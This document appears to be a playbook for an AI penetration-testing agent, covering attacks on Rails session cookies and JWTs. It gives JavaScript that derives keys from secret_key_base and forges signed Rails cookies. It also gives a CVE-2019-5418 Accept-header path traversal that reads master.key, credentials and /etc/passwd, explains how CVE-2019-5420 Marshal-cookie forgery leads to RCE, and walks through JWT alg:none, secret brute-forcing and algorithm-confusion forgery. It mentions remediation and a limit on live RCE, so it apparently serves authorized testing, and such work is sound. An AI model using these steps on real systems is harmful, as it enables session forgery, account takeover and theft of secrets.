# Rails session cookie, secret_key_base & JWT

Rails stores the session client-side in the `_<app>_session` cookie. Whether you
can read or FORGE it depends on the serializer and on whether `secret_key_base`
leaks. Do all decoding in `browser_evaluate_js` (atob/btoa, `crypto.subtle`, the
byte↔hex↔base64 helper in its description).

## 1. Read the cookie structure
`browser_get_cookies` → grab `_<app>_session`. URL-decode, then it is one of:
- **Signed (legacy default)**: `base64(payload)--hex(HMAC-SHA1)`. Split on `--`;
  `atob` the first half → readable JSON/Marshal session (`user_id`, flash, CSRF
  token). The HMAC is `OpenSSL::HMAC` over the payload with a key derived from
  `secret_key_base`. Confidentiality = none; integrity only.
- **Encrypted (Rails 5.1+ default)**: AES-256-GCM, base64 `ct--iv--tag` style —
  opaque without the key. Note it but you cannot read it without `secret_key_base`.
Decode the payload; if it's Marshal (`\x04\x08` / `BAh`), cross-ref skill:
deserialization — a forgeable Marshal session = RCE on load.

## 2. The secret_key_base angle
The signing/encryption key derives from `secret_key_base`. If you can LEAK it
(exposed `config/secrets.yml`, `config/master.key` + `credentials.yml.enc`,
`SECRET_KEY_BASE` in an error trace / `/rails/info`, or a public repo), you can
**forge any session** (set `user_id` to an admin).

Derive & forge in `browser_evaluate_js` (Web Crypto — undefined on non-localhost
http://, run this part on `about:blank` instead, then deliver via `http_request`
on the target page):

  async function railsKey(secret, salt, len) {
    const km = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret),
      "PBKDF2", false, ["deriveBits"]);
    return crypto.subtle.deriveBits(
      {name:"PBKDF2", salt:new TextEncoder().encode(salt), iterations:1000, hash:"SHA-1"},
      km, len*8);
  }
  // Signed cookie (payload--hexHMAC): 64-byte key, salt "signed cookie"
  const key = await railsKey(SECRET_KEY_BASE, "signed cookie", 64);
  const hk = await crypto.subtle.importKey("raw", key, {name:"HMAC",hash:"SHA-1"}, false, ["sign"]);
  const sig = b2h(new Uint8Array(await crypto.subtle.sign("HMAC", hk, new TextEncoder().encode(payloadB64))));
  // forged cookie = payloadB64 + "--" + sig

  // Encrypted cookie (Rails 5.2+ default, ct--iv--tag): 32-byte key, salt
  // "authenticated encrypted cookie", AES-256-GCM. Plaintext after decrypt is
  // wrapped: {"_rails":{"message":"<b64 payload>","exp":null,"pur":"cookie.session"}}
  // — re-parse that envelope before touching the inner payload.
- **CVE-2019-5418** (Action View <4.2.5.1/5.1.6.2/5.2.2.1): on ANY existing
  route, `http_request(url, headers:{"Accept":
  "../../../../../../../../config/master.key{{"})` — the trailing `{{` forces
  the traversal through the format lookup. A 200 with the file body IN-BAND
  confirms it; repeat for `.../config/credentials.yml.enc{{` and
  `.../../../etc/passwd{{`. Decrypt `credentials.yml.enc` with the leaked
  `master.key` (or use a directly-leaked `secret_key_base`) and continue with
  the forge above — this is the exact "doubletap" chain into CVE-2019-5420.
- **CVE-2019-5420** (Rails < 5.2.2.1/6.0.0.beta3 in **dev mode**): `secret_key_
  base` is *derived deterministically from the app name*, so it's predictable →
  forge a `:marshal` cookie carrying a deserialization gadget → RCE. Confirm dev
  mode first (skill: fingerprint). Demonstrate forgeability of a benign cookie;
  do not run a live RCE chain.

## 3. JWT (if the app uses tokens instead of cookies)
Decode header/payload with `browser_evaluate_js` (atob the two segments).
- **alg:none**: re-encode the header `{"alg":"none"}`, drop the signature, replay
  via `http_request` `headers:{"Authorization":"Bearer <forged>"}`. Accepted ⇒
  auth bypass.
- **Weak HMAC secret**: if `HS256`, brute the secret with `http_fuzz` (marker in
  the token, a wordlist) or recompute candidate signatures in `browser_evaluate_js`
  with `crypto.subtle` HMAC and compare.
- **alg confusion (RS256→HS256)**: sign with the public key as the HMAC secret.
- Tamper a claim (`sub`/`role`/`admin`), re-sign, replay; compare to baseline.

Evidence: the decoded session/JWT payload + a forged cookie/token the app accepts
(e.g. logged in as another user).
Remediation: keep `secret_key_base`/`master.key` secret and rotate if leaked; use
the `:json` serializer (never `:marshal`); upgrade past CVE-2019-5420; for JWT
pin the algorithm server-side and verify with a strong secret/public key.
